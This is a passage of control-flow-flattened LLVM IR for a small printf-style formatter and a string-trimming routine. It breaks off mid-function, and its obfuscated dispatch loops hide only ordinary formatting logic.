; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 1922248305, i32 478136314
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 478136314, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 111990564, i32 982147066
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -1786018954, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 639490624, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -220381670, i32 523678282
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 814012812, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 639490624, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1778847529, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1778847529, label %12
    i32 -1217804163, label %18
    i32 -1382437074, label %24
    i32 -1666874992, label %32
    i32 1489508315, label %33
    i32 1988469950, label %39
    i32 433826087, label %40
    i32 -1777508230, label %46
    i32 671620671, label %49
    i32 1638710500, label %50
    i32 398805896, label %56
    i32 -112276088, label %61
    i32 -1314705329, label %62
    i32 -643709296, label %68
    i32 1250892462, label %73
    i32 158814423, label %75
    i32 1225294113, label %84
    i32 997879614, label %87
    i32 483556313, label %93
    i32 -2008453825, label %99
    i32 77223402, label %105
    i32 -1875408902, label %110
    i32 1752872926, label %118
    i32 -100599475, label %120
    i32 -735403295, label %121
    i32 -1977660899, label %127
    i32 1248258094, label %133
    i32 813956575, label %140
    i32 1495282047, label %146
    i32 -1471845704, label %151
    i32 727242135, label %158
    i32 -748845089, label %164
    i32 1594389622, label %171
    i32 -279529083, label %177
    i32 635912356, label %182
    i32 1958341234, label %189
    i32 -736177074, label %195
    i32 -1248391099, label %202
    i32 -295921192, label %208
    i32 -5843122, label %213
    i32 -1491300410, label %220
    i32 -449580042, label %226
    i32 133841110, label %233
    i32 -2005835288, label %239
    i32 -246921533, label %244
    i32 1324897085, label %251
    i32 -740520152, label %257
    i32 -1496371638, label %263
    i32 -1843601009, label %269
    i32 1267732088, label %274
    i32 1549802568, label %286
    i32 1342415320, label %287
    i32 -1880010896, label %288
    i32 -283315045, label %295
    i32 2061845075, label %296
    i32 -468978289, label %299
    i32 688761015, label %303
    i32 -1705659499, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 -1217804163, i32 -468978289
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1382437074, i32 1342415320
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -1666874992, i32 1489508315
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -468978289, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 1988469950, i32 433826087
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1880010896, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -1777508230, i32 671620671
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 671620671, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 1638710500, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 398805896, i32 -112276088
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 1638710500, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 -1314705329, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -643709296, i32 1250892462
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 1250892462, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 158814423, i32 997879614
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 1225294113, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 -1314705329, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 483556313, i32 -1977660899
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -2008453825, i32 77223402
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1875408902, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1875408902, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 1752872926, i32 -100599475
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -735403295, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -735403295, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 1248258094, i32 727242135
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 813956575, i32 1495282047
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -1471845704, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -1471845704, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %5, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 120
  %163 = select i1 %162, i32 -748845089, i32 1958341234
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8**, i8*** %4, align 8
  store i8** %165, i8*** %.reg2mem26
  %166 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %166, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %167, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %168 = load i32, i32* %.reload34, align 8
  store i32 %168, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %169 = icmp ule i32 %.reload38, 40
  %170 = select i1 %169, i32 1594389622, i32 -279529083
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %172 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %173 = load i8*, i8** %172, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %174 = getelementptr i8, i8* %173, i32 %.reload37
  %175 = bitcast i8* %174 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %176 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %176, i32* %.reload33, align 8
  store i32 635912356, i32* %switchVar
  store i32* %175, i32** %.reg2mem84
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %178 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %179 = load i8*, i8** %178, align 8
  %180 = bitcast i8* %179 to i32*
  %181 = getelementptr i8, i8* %179, i32 8
  store i8* %181, i8** %178, align 8
  store i32 635912356, i32* %switchVar
  store i32* %180, i32** %.reg2mem84
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %183 = load i32, i32* %.reload85, align 4
  %184 = load i32, i32* %7, align 4
  %185 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %186 = call i32 @printi(i8** %.reload27, i32 %183, i32 16, i32 0, i32 %184, i32 %185, i32 97)
  %187 = load i32, i32* %9, align 4
  %188 = add nsw i32 %187, %186
  store i32 %188, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i8*, i8** %5, align 8
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 88
  %194 = select i1 %193, i32 -736177074, i32 -1491300410
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  %196 = load i8**, i8*** %4, align 8
  store i8** %196, i8*** %.reg2mem39
  %197 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %197, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %198 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %198, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %199 = load i32, i32* %.reload47, align 8
  store i32 %199, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %200 = icmp ule i32 %.reload51, 40
  %201 = select i1 %200, i32 -1248391099, i32 -295921192
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %205 = getelementptr i8, i8* %204, i32 %.reload50
  %206 = bitcast i8* %205 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %207 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %207, i32* %.reload46, align 8
  store i32 -5843122, i32* %switchVar
  store i32* %206, i32** %.reg2mem86
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  store i32 -5843122, i32* %switchVar
  store i32* %211, i32** %.reg2mem86
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %214 = load i32, i32* %.reload87, align 4
  %215 = load i32, i32* %7, align 4
  %216 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %217 = call i32 @printi(i8** %.reload40, i32 %214, i32 16, i32 0, i32 %215, i32 %216, i32 65)
  %218 = load i32, i32* %9, align 4
  %219 = add nsw i32 %218, %217
  store i32 %219, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %5, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 117
  %225 = select i1 %224, i32 -449580042, i32 1324897085
  store i32 %225, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i8**, i8*** %4, align 8
  store i8** %227, i8*** %.reg2mem52
  %228 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %228, %struct.__va_list_tag** %.reg2mem54
  %.reload57 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %229 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload57, i32 0, i32 0
  store i32* %229, i32** %.reg2mem58
  %.reload60 = load volatile i32*, i32** %.reg2mem58
  %230 = load i32, i32* %.reload60, align 8
  store i32 %230, i32* %.reg2mem61
  %.reload64 = load volatile i32, i32* %.reg2mem61
  %231 = icmp ule i32 %.reload64, 40
  %232 = select i1 %231, i32 133841110, i32 -2005835288
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %.reload56 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %234 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload56, i32 0, i32 3
  %235 = load i8*, i8** %234, align 8
  %.reload63 = load volatile i32, i32* %.reg2mem61
  %236 = getelementptr i8, i8* %235, i32 %.reload63
  %237 = bitcast i8* %236 to i32*
  %.reload62 = load volatile i32, i32* %.reg2mem61
  %238 = add i32 %.reload62, 8
  %.reload59 = load volatile i32*, i32** %.reg2mem58
  store i32 %238, i32* %.reload59, align 8
  store i32 -246921533, i32* %switchVar
  store i32* %237, i32** %.reg2mem88
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %.reload55 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem54
  %240 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload55, i32 0, i32 2
  %241 = load i8*, i8** %240, align 8
  %242 = bitcast i8* %241 to i32*
  %243 = getelementptr i8, i8* %241, i32 8
  store i8* %243, i8** %240, align 8
  store i32 -246921533, i32* %switchVar
  store i32* %242, i32** %.reg2mem88
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload89 = load i32*, i32** %.reg2mem88
  %245 = load i32, i32* %.reload89, align 4
  %246 = load i32, i32* %7, align 4
  %247 = load i32, i32* %8, align 4
  %.reload53 = load volatile i8**, i8*** %.reg2mem52
  %248 = call i32 @printi(i8** %.reload53, i32 %245, i32 10, i32 0, i32 %246, i32 %247, i32 97)
  %249 = load i32, i32* %9, align 4
  %250 = add nsw i32 %249, %248
  store i32 %250, i32* %9, align 4
  store i32 2061845075, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i8*, i8** %5, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 99
  %256 = select i1 %255, i32 -740520152, i32 1549802568
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %258, %struct.__va_list_tag** %.reg2mem65
  %.reload68 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %259 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload68, i32 0, i32 0
  store i32* %259, i32** %.reg2mem69
  %.reload71 = load volatile i32*, i32** %.reg2mem69
  %260 = load i32, i32* %.reload71, align 8
  store i32 %260, i32* %.reg2mem72
  %.reload75 = load volatile i32, i32* %.reg2mem72
  %261 = icmp ule i32 %.reload75, 40
  %262 = select i1 %261, i32 -1496371638, i32 -1843601009
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %.reload67 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload67, i32 0, i32 3
  %265 = load i8*, i8** %264, align 8
  %.reload74 = load volatile i32, i32* %.reg2mem72
  %266 = getelementptr i8, i8* %265, i32 %.reload74
  %267 = bitcast i8* %266 to i32*
  %.reload73 = load volatile i32, i32* %.reg2mem72
  %268 = add i32 %.reload73, 8
  %.reload70 = load volatile i32*, i32** %.reg2mem69
  store i32 %268, i32* %.reload70, align 8
  store i32 1267732088, i32* %switchVar
  store i32* %267, i32** %.reg2mem90
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload66 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem65
  %270 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload66, i32 0, i32 2
  %271 = load i8*, i8** %270, align 8
  %272 = bitcast i8* %271 to i32*
  %273 = getelementptr i8, i8* %271, i32 8
  store i8* %273, i8** %270, align 8
  store i32 1267732088, i32* %switchVar
  store i32* %272, i32** %.reg2mem90
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %.reload91 = load i32*, i32** %.reg2mem90
  %275 = load i32, i32* %.reload91, align 4
  %276 = trunc i32 %275 to i8
